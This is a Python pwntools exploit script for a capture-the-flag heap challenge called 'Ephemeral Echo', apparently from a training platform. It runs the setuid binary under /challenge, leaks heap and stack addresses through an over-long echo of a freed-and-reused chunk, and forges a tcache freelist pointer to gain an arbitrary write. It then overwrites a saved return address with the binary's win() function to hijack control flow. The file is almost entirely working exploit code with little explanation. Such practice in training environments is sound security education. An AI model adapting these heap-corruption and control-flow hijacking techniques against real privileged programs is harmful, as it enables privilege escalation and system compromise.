# Ephemeral Echo
import sys

import pwn

pwn.context.update(arch="amd64", os="linux", terminal=["tmux", "new-window"])


def tee[T: pwn.tube](process: T) -> T:
    orig_recv_raw = process.recv_raw
    output = sys.__stdout__.buffer  # type: ignore sys.stdout is replaced by pwn.term

    def recv_raw(numb, *args, **kwargs):
        data = orig_recv_raw(numb, *args, **kwargs) or b""  # orig may return str('')
        output.write(data)
        output.flush()
        return data

    process.recv_raw = recv_raw
    return process


def find_challenge(search_path="/challenge"):
    import os
    import stat
    from pathlib import Path

    xs = [
        str(f.absolute())
        for f in Path(search_path).iterdir()
        if f.is_file() and os.access(f, os.X_OK) and (f.stat().st_mode & stat.S_ISUID)
    ]
    if not xs:
        raise FileNotFoundError(f"No executable found in {search_path}")
    if len(xs) > 1:
        raise FileNotFoundError(f"Multiple executables found in {search_path}")
    return xs[0]


def one_round(io: pwn.process):
    tee(io)

    def leak_memory(offset):
        malloc_size = 0x20 # malloc size in 'echo'
        io.sendline(b"malloc 0 %d" % malloc_size)
        io.sendline(b"malloc 1 %d" % malloc_size)
        io.sendline(b"free 1")
        io.sendline(b"free 0")
        io.sendline(b"malloc 0 %d" % malloc_size)
        io.sendline(b"echo 0 %d" % (malloc_size + 0x10 + offset))
        io.recvuntil(b"Data: ")
        return pwn.u64(io.recvline(False).ljust(8, b"\x00"))

    def write_qword(addr, value):
        io.sendline(b"malloc 0 16")
        io.sendline(b"malloc 1 16")
        io.sendline(b"malloc 2 16")
        io.sendline(b"free 2")
        io.sendline(b"free 1")
        io.sendline(b"free 0")
        io.sendline(b"malloc 0 16")
        data = pwn.flat(
            {
                0x10: pwn.p64(0x00),  # PREV_SIZE
                0x18: pwn.p64(0x20 | 0x01),  # SIZE
                0x20: pwn.p64(addr),  # NEXT_ADDR
            }
        )
        io.sendline(b"read 0 %d" % len(data))
        io.sendline(data)

        io.sendline(b"malloc 0 16")
        io.sendline(b"malloc 0 16")
        data = value.to_bytes(8, "little")
        io.sendline(b"read 0 %d" % len(data))
        io.sendline(data)

    addrof_bin_echo = leak_memory(0x00)
    addrof_stackstr = leak_memory(0x08)
    pwn.success(f"Address of /bin/echo string: {hex(addrof_bin_echo)}")
    pwn.success(f"Address of string on stack: {hex(addrof_stackstr)}")

    elf = io.elf
    elf.address = addrof_bin_echo - next(elf.search(b"/bin/echo\0"))
    win_addr = elf.symbols["win"]
    ret_addr = addrof_stackstr + 0xE + 0x8
    pwn.success(f"Address of win(): {hex(win_addr)}")

    write_qword(ret_addr, win_addr)
    io.sendline(b"quit")
    io.recvrepeat()

def ctf():
    root_bin = find_challenge()
    with pwn.process(root_bin, raw=True, level="error") as io:
        one_round(io)


if __name__ == "__main__":
    ctf()
